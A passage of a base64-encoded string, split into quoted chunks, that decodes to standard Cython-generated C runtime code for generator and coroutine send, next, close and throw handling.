gX19QeXhfcHlpdGVyX3NlbmRmdW5jIGdlbl9hbV9zZW5kLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICoqcmV0dmFsKSB7CiAgICBQeU9iamVjdCAqcmV0ID0gTlVMTDsKICAgIF9fUHl4X1B5U2VuZFJlc3VsdCBkZWxlZ2F0ZV9yZXN1bHQsIHJlc3VsdDsKICAgIGFzc2VydChfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoZ2VuKSk7CiAgICBkZWxlZ2F0ZV9yZXN1bHQgPSBnZW5fYW1fc2VuZChnZW4tPnlpZWxkZnJvbSwgdmFsdWUsICZyZXQpOwogICAgaWYgKGRlbGVnYXRlX3Jlc3VsdCA9PSBQWUdFTl9ORVhUKSB7CiAgICAgICAgYXNzZXJ0IChyZXQgIT0gTlVMTCk7CiAgICAgICAgKnJldHZhbCA9IHJldDsKICAgICAgICByZXR1cm4gUFlHRU5fTkVYVDsKICAgIH0KICAgIGFzc2VydCAoZGVsZWdhdGVfcmVzdWx0ICE9IFBZR0VOX0VSUk9SIHx8IHJldCA9PSBOVUxMKTsKICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7CiAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgcmV0LCByZXR2YWwsIDApOwogICAgUHlfWERFQ1JFRihyZXQpOwogICAgcmV0dXJuIHJlc3VsdDsKfQojZW5kaWYKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfU2VuZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlKSB7CiAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDsKICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfQW1TZW5kKHNlbGYsIHZhbHVlLCAmcmV0dmFsKTsKICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChzZWxmLCByZXN1bHQsIHJldHZhbCwgMCk7Cn0Kc3RhdGljIF9fUHl4X1B5U2VuZFJlc3VsdApfX1B5eF9Db3JvdXRpbmVfQW1TZW5kKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICoqcmV0dmFsKSB7CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0OwogICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0Kikgc2VsZjsKICAgIGlmICh1bmxpa2VseShfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoZ2VuKSkpIHsKICAgICAgICAqcmV0dmFsID0gX19QeXhfQ29yb3V0aW5lX0FscmVh""ZHlSdW5uaW5nRXJyb3IoZ2VuKTsKICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7CiAgICB9CiAgICAjaWYgQ1lUSE9OX1VTRV9BTV9TRU5ECiAgICBpZiAoZ2VuLT55aWVsZGZyb21fYW1fc2VuZCkgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kVG9EZWxlZ2F0ZShnZW4sIGdlbi0+eWllbGRmcm9tX2FtX3NlbmQsIHZhbHVlLCByZXR2YWwpOwogICAgfSBlbHNlCiAgICAjZW5kaWYKICAgIGlmIChnZW4tPnlpZWxkZnJvbSkgewogICAgICAgIFB5T2JqZWN0ICp5ZiA9IGdlbi0+eWllbGRmcm9tOwogICAgICAgIFB5T2JqZWN0ICpyZXQ7CiAgICAgICNpZiAhQ1lUSE9OX1VTRV9BTV9TRU5ECiAgICAgICAgI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VECiAgICAgICAgaWYgKF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZCh5ZiwgdmFsdWUpOwogICAgICAgIH0gZWxzZQogICAgICAgICNlbmRpZgogICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogICAgICAgIGlmIChfX1B5eF9Db3JvdXRpbmVfQ2hlY2soeWYpKSB7CiAgICAgICAgICAgIHJldCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kKHlmLCB2YWx1ZSk7CiAgICAgICAgfSBlbHNlCiAgICAgICAgI2VuZGlmCiAgICAgICAgI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRUQKICAgICAgICBpZiAoX19weXhfUHlBc3luY0dlbkFTZW5kX0NoZWNrRXhhY3QoeWYpKSB7CiAgICAgICAgICAgIHJldCA9IF9fUHl4X2FzeW5jX2dlbl9hc2VuZF9zZW5kKHlmLCB2YWx1ZSk7CiAgICAgICAgfSBlbHNlCiAgICAgICAgI2VuZGlmCiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgICAgIGlmIChQeUdlbl9DaGVja0V4YWN0KHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9QeUdlbl9TZW5kKChQeUdlbk9iamVjdCopeWYsIHZhbHVlID09IFB5X05vbmUgPyBOVUxMIDogdmFsdWUpOwogICAgICAgIH0gZWxzZQogICAgICAgIGlmIChQeUNvcm9fQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlHZW5fU2VuZCgoUHlHZW5PYmplY3QqKXlmLCB2YWx1ZSA9PSBQeV9Ob25lID8gTlVMTCA6IHZhbHVlKTsKICAgICAgICB9IGVsc2UKICAgICAgICAjZW5kaWYKICAgICAgI2VuZGlmCiAgICAgICAgewogICAgICAgICAgICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMDAwCiAgICAgICAgICAgIGlmICh2YWx1ZSA9PSBQeV9Ob25lICYmIFB5SXRlcl9DaGVjayh5ZikpCiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeUl0ZXJfTmV4dF9QbGFpbih5Zik7CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMSh5ZiwgX19weXhfbXN0YXRlX2ds""b2JhbC0+X19weXhfbl91X3NlbmQsIHZhbHVlKTsKICAgICAgICB9CiAgICAgICAgaWYgKGxpa2VseShyZXQpKSB7CiAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICAgICAgICAgICpyZXR2YWwgPSByZXQ7CiAgICAgICAgICAgIHJldHVybiBQWUdFTl9ORVhUOwogICAgICAgIH0KICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfRmluaXNoRGVsZWdhdGlvbihnZW4sIHJldHZhbCk7CiAgICB9IGVsc2UgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCB2YWx1ZSwgcmV0dmFsLCAwKTsKICAgIH0KICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQgX19QeXhfQ29yb3V0aW5lX0Nsb3NlSXRlcihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgUHlPYmplY3QgKnlmKSB7CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0OwogICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihnZW4pOwogICAgYXNzZXJ0KF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZyhnZW4pKTsKICAgICNpZmRlZiBfX1B5eF9HZW5lcmF0b3JfVVNFRAogICAgaWYgKF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKSkgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZSh5ZiwgJnJldHZhbCk7CiAgICB9IGVsc2UKICAgICNlbmRpZgogICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgICBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrKHlmKSkgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZSh5ZiwgJnJldHZhbCk7CiAgICB9IGVsc2UKICAgIGlmIChfX1B5eF9Db3JvdXRpbmVBd2FpdF9DaGVja0V4YWN0KHlmKSkgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZUF3YWl0X0Nsb3NlKChfX3B5eF9Db3JvdXRpbmVBd2FpdE9iamVjdCopeWYpOwogICAgfSBlbHNlCiAgICAjZW5kaWYKICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgICBpZiAoX19weXhfUHlBc3luY0dlbkFTZW5kX0NoZWNrRXhhY3QoeWYpKSB7CiAgICAgICAgcmV0dmFsID0gX19QeXhfYXN5bmNfZ2VuX2FzZW5kX2Nsb3NlKHlmLCBOVUxMKTsKICAgICAgICByZXN1bHQgPSBQWUdFTl9SRVRVUk47CiAgICB9IGVsc2UKICAgIGlmIChfX3B5eF9QeUFzeW5jR2VuQVRocm93X0NoZWNrRXhhY3QoeWYpKSB7CiAgICAgICAgcmV0dmFsID0gX19QeXhfYXN5bmNfZ2VuX2F0aHJvd19jbG9zZSh5ZiwgTlVMTCk7CiAgICAgICAgcmVzdWx0ID0gUFlHRU5fUkVUVVJOOwogICAgfSBlbHNlCiAgICAjZW5kaWYKICAgIHsKICAgICAgICBQeU9iamVjdCAqbWV0aDsKICAgICAgICByZXN1bHQgPSBQWUdFTl9SRVRVUk47CiAgICAgICAgbWV0aCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKHlmLCBfX3B5eF9t""c3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xvc2UpOwogICAgICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSB7CiAgICAgICAgICAgICAgICBQeUVycl9Xcml0ZVVucmFpc2FibGUoeWYpOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmV0dmFsID0gX19QeXhfUHlPYmplY3RfQ2FsbE5vQXJnKG1ldGgpOwogICAgICAgICAgICBQeV9ERUNSRUYobWV0aCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghcmV0dmFsKSkgewogICAgICAgICAgICAgICAgcmVzdWx0ID0gUFlHRU5fRVJST1I7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBQeV9YREVDUkVGKHJldHZhbCk7CiAgICByZXR1cm4gcmVzdWx0ID09IFBZR0VOX0VSUk9SID8gLTEgOiAwOwp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2VuZXJhdG9yX05leHQoUHlPYmplY3QgKnNlbGYpIHsKICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQ7CiAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCopIHNlbGY7CiAgICBpZiAodW5saWtlbHkoX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKGdlbikpKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbik7CiAgICB9CiAgICAjaWYgQ1lUSE9OX1VTRV9BTV9TRU5ECiAgICBpZiAoZ2VuLT55aWVsZGZyb21fYW1fc2VuZCkgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kVG9EZWxlZ2F0ZShnZW4sIGdlbi0+eWllbGRmcm9tX2FtX3NlbmQsIFB5X05vbmUsICZyZXR2YWwpOwogICAgfSBlbHNlCiAgICAjZW5kaWYKICAgIGlmIChnZW4tPnlpZWxkZnJvbSkgewogICAgICAgIFB5T2JqZWN0ICp5ZiA9IGdlbi0+eWllbGRmcm9tOwogICAgICAgIFB5T2JqZWN0ICpyZXQ7CiAgICAgICAgI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VECiAgICAgICAgaWYgKF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9HZW5lcmF0b3JfTmV4dCh5Zik7CiAgICAgICAgfSBlbHNlCiAgICAgICAgI2VuZGlmCiAgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgICAgICAgaWYgKF9fUHl4X0Nvcm91dGluZV9DaGVja0V4YWN0KHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZCh5ZiwgUHlfTm9uZSk7CiAgICAgICAgfSBlbHNlCiAgICAgICAgI2VuZGlmCiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiAoUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMEEzIHx8ICFDWVRIT05fVVNFX0FNX1NFTkQpCiAgICAgICAgaWYgKFB5R2VuX0NoZWNrRXhhY3QoeWYpKSB7CiAgICAgICAgICAgIHJldCA9IF9fUHl4X1B5R2VuX1Nl""bmQoKFB5R2VuT2JqZWN0Kil5ZiwgTlVMTCk7CiAgICAgICAgfSBlbHNlCiAgICAgICAgI2VuZGlmCiAgICAgICAgICAgIHJldCA9IF9fUHl4X1B5SXRlcl9OZXh0X1BsYWluKHlmKTsKICAgICAgICBpZiAobGlrZWx5KHJldCkpIHsKICAgICAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTsKICAgICAgICAgICAgcmV0dXJuIHJldDsKICAgICAgICB9CiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0ZpbmlzaERlbGVnYXRpb24oZ2VuLCAmcmV0dmFsKTsKICAgIH0gZWxzZSB7CiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIFB5X05vbmUsICZyZXR2YWwsIDApOwogICAgfQogICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTsKICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChzZWxmLCByZXN1bHQsIHJldHZhbCwgMSk7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfQ2xvc2VfTWV0aG9kKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnKSB7CiAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDsKICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQ7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihhcmcpOwogICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0Nsb3NlKHNlbGYsICZyZXR2YWwpOwogICAgaWYgKHVubGlrZWx5KHJlc3VsdCA9PSBQWUdFTl9FUlJPUikpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICBQeV9YREVDUkVGKHJldHZhbCk7CiAgICBQeV9SRVRVUk5fTk9ORTsKfQpzdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0Cl9fUHl4X0Nvcm91dGluZV9DbG9zZShQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKipyZXR2YWwpIHsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmOwogICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDsKICAgIFB5T2JqZWN0ICp5ZjsKICAgIGludCBlcnIgPSAwOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhnZW4pKSkgewogICAgICAgICpyZXR2YWwgPSBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pOwogICAgICAgIHJldHVybiBQWUdFTl9FUlJPUjsKICAgIH0KICAgIHlmID0gZ2VuLT55aWVsZGZyb207CiAgICBpZiAoeWYpIHsKICAgICAgICBQeV9JTkNSRUYoeWYpOwogICAgICAgIGVyciA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZUl0ZXIoZ2VuLCB5Zik7CiAgICAgICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTsKICAgICAgICBQeV9ERUNSRUYoeWYpOwogICAgfQogICAgaWYgKGVyciA9PSAwKQogICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfR2VuZXJhdG9yRXhpdCk7CiAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgTlVMTCwgcmV0dmFsLCAxKTsKICAgIGlm""IChyZXN1bHQgPT0gUFlHRU5fRVJST1IpIHsKICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICAgICAgaWYgKCFfX1B5eF9QeUVycl9PY2N1cnJlZCgpKSB7CiAgICAgICAgICAgIHJldHVybiBQWUdFTl9SRVRVUk47CiAgICAgICAgfSBlbHNlIGlmIChsaWtlbHkoX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlczIoUHlFeGNfR2VuZXJhdG9yRXhpdCwgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSB7CiAgICAgICAgICAgIF9fUHl4X1B5RXJyX0NsZWFyKCk7CiAgICAgICAgICAgIHJldHVybiBQWUdFTl9SRVRVUk47CiAgICAgICAgfQogICAgICAgIHJldHVybiBQWUdFTl9FUlJPUjsKICAgIH0gZWxzZSBpZiAobGlrZWx5KHJlc3VsdCA9PSBQWUdFTl9SRVRVUk4gJiYgKnJldHZhbCA9PSBQeV9Ob25lKSkgewogICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICAgICAgcmV0dXJuIFBZR0VOX1JFVFVSTjsKICAgIH0gZWxzZSB7CiAgICAgICAgY29uc3QgY2hhciAqbXNnOwogICAgICAgIFB5X0RFQ1JFRigqcmV0dmFsKTsKICAgICAgICAqcmV0dmFsID0gTlVMTDsKICAgICAgICBpZiAoKDApKSB7CiAgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgICAgICAgfSBlbHNlIGlmIChfX1B5eF9Db3JvdXRpbmVfQ2hlY2soc2VsZikpIHsKICAgICAgICAgICAgbXNnID0gImNvcm91dGluZSBpZ25vcmVkIEdlbmVyYXRvckV4aXQiOwogICAgICAgICNlbmRpZgogICAgICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgICAgICAgfSBlbHNlIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KHNlbGYpKSB7CiAgICAgICAgICAgIG1zZyA9ICJhc3luYyBnZW5lcmF0b3IgaWdub3JlZCBHZW5lcmF0b3JFeGl0IjsKICAgICAgICAjZW5kaWYKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBtc2cgPSAiZ2VuZXJhdG9yIGlnbm9yZWQgR2VuZXJhdG9yRXhpdCI7CiAgICAgICAgfQogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19SdW50aW1lRXJyb3IsIG1zZyk7CiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTsKICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7CiAgICB9Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9fQ29yb3V0aW5lX1Rocm93KFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdHlwLCBQeU9iamVjdCAqdmFsLCBQeU9iamVjdCAqdGIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqYXJncywgaW50IGNsb3NlX29uX2dlbmV4aXQpIHsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmOwogICAgUHlPYmplY3QgKnlmOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X0Nvcm91""dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhnZW4pKSkKICAgICAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKTsKICAgIHlmID0gZ2VuLT55aWVsZGZyb207CiAgICBpZiAoeWYpIHsKICAgICAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0OwogICAgICAgIFB5T2JqZWN0ICpyZXQ7CiAgICAgICAgUHlfSU5DUkVGKHlmKTsKICAgICAgICBpZiAoX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKHR5cCwgUHlFeGNfR2VuZXJhdG9yRXhpdCkgJiYgY2xvc2Vfb25fZ2VuZXhpdCkgewogICAgICAgICAgICBpbnQgZXJyID0gX19QeXhfQ29yb3V0aW5lX0Nsb3NlSXRlcihnZW4sIHlmKTsKICAgICAgICAgICAgUHlfREVDUkVGKHlmKTsKICAgICAgICAgICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTsKICAgICAgICAgICAgaWYgKGVyciA8IDApCiAgICAgICAgICAgICAgICBnb3RvIHByb3BhZ2F0ZV9leGNlcHRpb247CiAgICAgICAgICAgIGdvdG8gdGhyb3dfaGVyZTsKICAgICAgICB9CiAgICAgICAgaWYgKDAKICAgICAgICAjaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRUQKICAgICAgICAgICAgfHwgX19QeXhfR2VuZXJhdG9yX0NoZWNrRXhhY3QoeWYpCiAgICAgICAgI2VuZGlmCiAgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgICAgICAgICAgIHx8IF9fUHl4X0Nvcm91dGluZV9DaGVjayh5ZikKICAgICAgICAjZW5kaWYKICAgICAgICAgICAgKSB7CiAgICAgICAgICAgIHJldCA9IF9fUHl4X19Db3JvdXRpbmVfVGhyb3coeWYsIHR5cCwgdmFsLCB0YiwgYXJncywgY2xvc2Vfb25fZ2VuZXhpdCk7CiAgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgICAgICAgfSBlbHNlIGlmIChfX1B5eF9Db3JvdXRpbmVBd2FpdF9DaGVja0V4YWN0KHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9fQ29yb3V0aW5lX1Rocm93KCgoX19weXhfQ29yb3V0aW5lQXdhaXRPYmplY3QqKXlmKS0+Y29yb3V0aW5lLCB0eXAsIHZhbCwgdGIsIGFyZ3MsIGNsb3NlX29uX2dlbmV4aXQpOwogICAgICAgICNlbmRpZgogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICptZXRoID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoeWYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aHJvdyk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRih5Zik7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIHsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTsKICAgICAgICAgICAgICAgIGdvdG8g""dGhyb3dfaGVyZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAobGlrZWx5KGFyZ3MpKSB7CiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKG1ldGgsIGFyZ3MsIE5VTEwpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgUHlPYmplY3QgKmNhcmdzWzRdID0ge05VTEwsIHR5cCwgdmFsLCB0Yn07CiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChtZXRoLCBjYXJncysxLCAzIHwgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBQeV9ERUNSRUYobWV0aCk7CiAgICAgICAgfQogICAgICAgIFB5X0RFQ1JFRih5Zik7CiAgICAgICAgaWYgKHJldCkgewogICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgICAgICAgICByZXR1cm4gcmV0OwogICAgICAgIH0KICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfRmluaXNoRGVsZWdhdGlvbihnZW4sICZyZXQpOwogICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICAgICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9NZXRob2RSZXR1cm5Gcm9tUmVzdWx0KHNlbGYsIHJlc3VsdCwgcmV0LCAwKTsKICAgIH0KdGhyb3dfaGVyZToKICAgIF9fUHl4X1JhaXNlKHR5cCwgdmFsLCB0YiwgTlVMTCk7CnByb3BhZ2F0ZV9leGNlcHRpb246CiAgICB7CiAgICAgICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7CiAgICAgICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCBOVUxMLCAmcmV0dmFsLCAwKTsKICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChzZWxmLCByZXN1bHQsIHJldHZhbCwgMCk7CiAgICB9Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfVGhyb3coUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmdzKSB7CiAgICBQeU9iamVjdCAqdHlwOwogICAgUHlPYmplY3QgKnZhbCA9IE5VTEw7CiAgICBQeU9iamVjdCAqdGIgPSBOVUxMOwogICAgaWYgKHVubGlrZWx5KCFQeUFyZ19VbnBhY2tUdXBsZShhcmdzLCAidGhyb3ciLCAxLCAzLCAmdHlwLCAmdmFsLCAmdGIpKSkKICAgICAgICByZXR1cm4gTlVMTDsKICAgIHJldHVybiBfX1B5eF9fQ29yb3V0aW5lX1Rocm93KHNlbGYsIHR5cCwgdmFsLCB0YiwgYXJncywgMSk7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0Nvcm91dGluZV90cmF2ZXJzZV9leGNzdGF0ZShfX1B5eF9FeGNJbmZvU3RydWN0ICpleGNfc3RhdGUsIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKSB7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0CiAgICBQeV9WSVNJVChleGNfc3RhdGUtPmV4Y192YWx1ZSk7CiNl""bHNlCiAgICBQeV9WSVNJVChleGNfc3RhdGUtPmV4Y190eXBlKTsKICAgIFB5X1ZJU0lUKGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKTsKICAgIFB5X1ZJU0lUKGV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjayk7CiNlbmRpZgogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIGludCBfX1B5eF9Db3JvdXRpbmVfdHJhdmVyc2UoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKSB7CiAgICB7CiAgICAgICAgaW50IGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UoKFB5T2JqZWN0KilnZW4sIDEsIHZpc2l0LCBhcmcpOwogICAgICAgIGlmIChlKSByZXR1cm4gZTsKICAgIH0KICAgIFB5X1ZJU0lUKGdlbi0+Y2xvc3VyZSk7CiAgICBQeV9WSVNJVChnZW4tPmNsYXNzb2JqKTsKICAgIFB5X1ZJU0lUKGdlbi0+eWllbGRmcm9tKTsKICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfdHJhdmVyc2VfZXhj